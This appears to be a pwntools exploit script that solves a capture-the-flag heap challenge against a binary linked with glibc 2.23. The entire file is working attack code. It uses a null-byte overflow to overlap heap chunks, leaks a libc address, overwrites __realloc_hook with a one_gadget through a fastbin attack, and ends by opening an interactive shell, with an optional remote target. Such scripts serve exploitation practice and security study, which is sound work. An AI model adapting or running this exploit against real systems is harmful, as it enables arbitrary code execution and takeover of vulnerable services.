#!/usr/bin/env python3

from pwn import *

exe = ELF("./pwn5_null_patched")
libc = ELF("./libc.2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* main +35
        c
        c
        ''')
        sleep(1)

def create_heap(idx,size,data):
    sla(">",b'1')
    slna("Index:",idx)
    slna("Input size:",size)
    sla("Input data:",data)

def show_heap(idx):
    sla(">",b'2')
    slna("Index:",idx)

def edit_heap(idx,data):
    sla(">",b'3')
    slna("Input index:",idx)
    slna("Input newsize:",len(data))
    sla("(y/n)?",b'y')
    s(data)
def remove_heap(idx):
    sla(">",b'4')
    slna("Input index:",idx)

if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])



create_heap(0,0x200,b'hello')
create_heap(1,0x200,b'hello')

create_heap(2,0x200,b'hello')
create_heap(3,0x200,b'hello')

create_heap(4,0x200,b'hello')
# GDB()
create_heap(8,0x20,b'hello') ## prevent cosollidation



payload = b'\0'*0x1f0 
payload += p64(0x200) # Change prev size = 0x200
edit_heap(2,payload)

remove_heap(2)

payload = b'\0'*0x208 # overwrite one byte null to heap chunk 2
# size chunk 2: 0x211 -> 200
edit_heap(1,payload)


create_heap(5,0x100,b'hello') # slice chunk2 to 2 part
create_heap(6,0x80,b'victim_chunk')


remove_heap(5)
remove_heap(3) # trick to collapse 2 chunks (chunk 6 still live in the middle)
create_heap(7,0x400,b'hello') # malloc again and overwrite chunk 6
payload = b'a'*0x108
payload += p64(0x91)
payload += p64(0xdeadbeef)
payload += b'\0'*0x80
payload += p64(0x81)
payload += b'\0'*0x70
payload += p64(0x80)
payload += p64(0x91)
edit_heap(7,payload) 

remove_heap(6) 

sla(">",b'3')
slna("Input index:",8)
slna("Input newsize:",0x80)
sla("(y/n)?",b'n')  # malloc chunk 6 again without input data to keep libc addr


show_heap(8) # leak libc addr
p.recvuntil(b'Data = ')
leak_addr = u64(p.recv(6)+b'\0\0')
info("leak libc: "+ hex(leak_addr))
libc.address = leak_addr - 0x39bb78
info("libc: "+ hex(libc.address))


payload = b'a'*0x108
payload += p64(0x71)
payload += p64(0xdeadbeef)
payload += b'\0'*0x60
payload += p64(0x80)
edit_heap(7,payload)

remove_heap(8)

payload = b'a'*0x108
payload += p64(0x71)
payload += p64(libc.sym['__realloc_hook'] -0x1b)
payload += b'\0'*0x60
payload += p64(0x80)
edit_heap(7,payload) # overwrite freed chunk

create_heap(6,0x60,b'hello')
payload = b'a'*0xb
payload += p64(libc.address + 0xd5bf7)
payload += p64(libc.sym['realloc']+8) 
create_heap(8,0x60,payload)
info("one_gadget: "+hex((libc.address + 0xd5bf7)))
info("realloc_hook:"+ hex(libc.sym['__realloc_hook'] ))

sla(">",b'1')
slna("Index:",3)
slna("Input size:",0x20)

p.interactive()




